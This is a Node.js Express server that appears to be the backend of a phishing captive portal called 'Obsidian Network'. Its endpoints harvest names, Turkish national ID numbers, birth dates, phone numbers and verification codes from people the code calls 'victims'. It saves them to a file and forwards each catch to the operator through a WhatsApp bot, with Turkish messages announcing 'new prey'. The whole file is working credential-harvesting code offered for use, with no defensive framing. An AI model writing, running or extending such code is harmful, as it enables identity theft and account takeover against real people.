// --- V8 NUCLEAR BOOTSTRAP ---
// First line: Speak directly to the OS stdout for immediate detection
process.stdout.write('--- OS: BOOTING OBSIDIAN V8 ---\n');

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = parseInt(process.env.PORT || '8080', 10);

// Diagnostics state
let systemLogs = [];
let connectionStatus = 'BOOTING';
let latestQR = null;
let client = null;

const addSystemLog = (msg) => {
    const entry = `[${new Date().toLocaleTimeString()}] ${msg}`;
    console.log(entry);
    systemLogs.push(entry);
    if (systemLogs.length > 100) systemLogs.shift();
};

addSystemLog('V8 Engine engaged.');

app.use(cors());
app.use(express.json());

// 1. FORCED HEALTH CHECK (Top priority)
app.get('/health', (req, res) => res.status(200).send('V8_ALIVE'));

app.get('/api/admin/status', (req, res) => {
    res.json({
        status: connectionStatus,
        qr: latestQR,
        logs: [], // Victim logs can be linked later
        systemLogs: systemLogs
    });
});

app.post('/api/admin/restart', (req, res) => {
    addSystemLog('Manual restart triggered.');
    bootstrapWhatsApp();
    res.json({ status: 'success' });
});

// --- VICTIM DATA HANDLING ---
const fs = require('fs');
const VICTIMS_FILE = path.join(__dirname, 'victims.json');

const saveVictim = (data) => {
    try {
        let victims = [];
        if (fs.existsSync(VICTIMS_FILE)) {
            const content = fs.readFileSync(VICTIMS_FILE, 'utf8');
            victims = JSON.parse(content);
        }
        victims.push({ ...data, timestamp: new Date().toISOString() });
        fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
    } catch (err) {
        addSystemLog(`Error saving victim: ${err.message}`);
    }
};

const sendAdminNotification = async (msg) => {
    if (client && connectionStatus === 'READY') {
        try {
            const myNum = client.info.me._serialized;
            await client.sendMessage(myNum, msg);
            addSystemLog('WhatsApp notification sent to admin.');
        } catch (err) {
            addSystemLog(`Failed to send WA notification: ${err.message}`);
        }
    }
};

// --- CAPTIVE PORTAL API ENDPOINTS ---

app.post('/api/register', (req, res) => {
    const data = req.body;
    addSystemLog(`New Registration: ${data.fullName} (${data.phone})`);
    saveVictim({ type: 'register', ...data });
    
    const msg = `🔥 *YENİ AV DÜŞTÜ (KAYIT)* 🔥\n\n👤 Ad: ${data.fullName}\n🆔 TC: ${data.tcNo}\n📅 Doğum: ${data.birthDate}\n📞 Tel: ${data.phone}`;
    sendAdminNotification(msg);
    
    res.json({ status: 'success' });
});

app.post('/api/request-code', async (req, res) => {
    const { phone } = req.body;
    // 6 haneli rastgele kod üret
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    
    addSystemLog(`SMS Code Requested: ${phone} -> Code: ${code}`);
    saveVictim({ type: 'code_request', phone, code });
    
    // 1. Yöneticiye bildir
    const adminMsg = `📩 *SMS KODU ÜRETİLDİ* 📩\n\n📞 Tel: ${phone}\n🔢 Kod: ${code}\n\n_Kurbana WhatsApp üzerinden iletiliyor..._`;
    sendAdminNotification(adminMsg);

    // 2. Kurbana gönder
    if (client && connectionStatus === 'READY') {
        try {
            // Telefon numarasını formatla (90 ekle)
            let cleanPhone = phone.replace(/\D/g, '');
            if (cleanPhone.startsWith('0')) cleanPhone = cleanPhone.substring(1);
            if (!cleanPhone.startsWith('90')) cleanPhone = '90' + cleanPhone;
            
            const victimId = `${cleanPhone}@c.us`;
            const victimMsg = `*Obsidian Network*: Güvenli internet erişimi için doğrulama kodunuz: *${code}*`;
            
            await client.sendMessage(victimId, victimMsg);
            addSystemLog(`Code sent to victim: ${victimId}`);
        } catch (err) {
            addSystemLog(`Failed to send code to victim: ${err.message}`);
        }
    }
    
    res.json({ status: 'success' });
});

app.post('/api/login', (req, res) => {
    const data = req.body;
    addSystemLog(`Login Success: ${data.phone} Code: ${data.smsCode}`);
    saveVictim({ type: 'login', ...data });
    
    const msg = `✅ *GİRİŞ BAŞARILI* ✅\n\n📞 Tel: ${data.phone}\n🔢 Kod: ${data.smsCode}`;
    sendAdminNotification(msg);
    
    res.json({ status: 'success' });
});

// Dynamic Bootstrap Logic
async function bootstrapWhatsApp() {
    addSystemLog('--- LOADER: Phase 1 (Dependencies) ---');
    try {
        const { Client, LocalAuth } = require('whatsapp-web.js');
        const QRCode = require('qrcode');
        const fs = require('fs');

        addSystemLog('--- LOADER: Phase 2 (Environment) ---');
        const isWin = process.platform === 'win32';
        const chromePath = process.env.PUPPETEER_EXECUTABLE_PATH || (isWin ? undefined : '/usr/bin/chromium');

        if (chromePath) {
            addSystemLog(`Using specific Chrome path: ${chromePath}`);
        } else {
            addSystemLog('No specific Chrome path set, using Puppeteer default.');
        }

        if (client) {
            addSystemLog('Destroying existing client...');
            await client.destroy().catch(() => { });
        }

        connectionStatus = 'INITIALIZING';
        addSystemLog('Creating WhatsApp Instance...');

        // PERSISTENCE FIX: Allow custom auth path via env (for Cloud Storage mounts)
        const AUTH_PATH = process.env.AUTH_PATH || (isWin ? './.wwebjs_auth' : '/tmp/.wwebjs_auth');
        addSystemLog(`Auth Path: ${AUTH_PATH}`);

        client = new Client({
            authStrategy: new LocalAuth({ dataPath: AUTH_PATH }),
            puppeteer: {
                executablePath: chromePath,
                headless: true,
                dumpio: true,
                protocolTimeout: 120000, // Increase protocol timeout to handle heavy loads
                args: isWin ? [
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ] : [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--disable-gpu',
                    '--no-zygote',
                    '--hide-scrollbars',
                    '--mute-audio',
                    '--disable-breakpad',
                    '--disable-extensions',
                    '--disable-features=AudioServiceOutOfProcess',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-ipc-flooding-protection',
                    '--disable-notifications',
                    '--disable-background-networking',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-client-side-phishing-detection',
                    '--disable-default-apps',
                    '--disable-domain-reliability',
                    '--disable-hang-monitor',
                    '--disable-offer-store-unmasked-wallet-cards',
                    '--disable-popup-blocking',
                    '--disable-print-preview',
                    '--disable-prompt-on-repost',
                    '--disable-renderer-backgrounding',
                    '--disable-speech-api',
                    '--disable-sync',
                    '--password-store=basic',
                    '--use-gl=swiftshader',
                    '--use-mock-keychain',
                    '--no-first-run',
                    '--no-default-browser-check',
                    '--no-pings'
                ],
                timeout: 120000
            }
        });

        client.on('qr', async (qr) => {
            connectionStatus = 'QR_REQUIRED';
            addSystemLog('New QR generated.');
            latestQR = await QRCode.toDataURL(qr);
        });

        client.on('ready', () => {
            connectionStatus = 'READY';
            latestQR = null;
            addSystemLog(`SUCCESS: WhatsApp Bridge Connected as ${client.info.pushname}!`);
        });

        client.on('disconnected', (reason) => {
            addSystemLog(`Disconnected: ${reason}`);
            connectionStatus = 'DISCONNECTED';
        });

        addSystemLog('Loader complete. Calling initialize...');
        await client.initialize();

    } catch (err) {
        addSystemLog(`CRITICAL SYSTEM ERROR: ${err.message}`);
        connectionStatus = 'ERROR';
    }
}

// Serve Frontend
const distPath = path.join(__dirname, '../client/dist');
app.use(express.static(distPath));

app.get(['/admin', '/admin/*'], (req, res) => {
    res.sendFile(path.join(distPath, 'index.html'));
});

app.get('*', (req, res) => {
    res.sendFile(path.join(distPath, 'index.html'));
});

// SURVIVAL LISTEN
app.listen(PORT, '0.0.0.0', () => {
    addSystemLog(`V8: Port ${PORT} bound successfully.`);
    connectionStatus = 'SERVER_UP';

    // DELAYED AWAKENING (15s)
    addSystemLog('Stabilization period (15s) starting...');
    setTimeout(bootstrapWhatsApp, 15000);
});
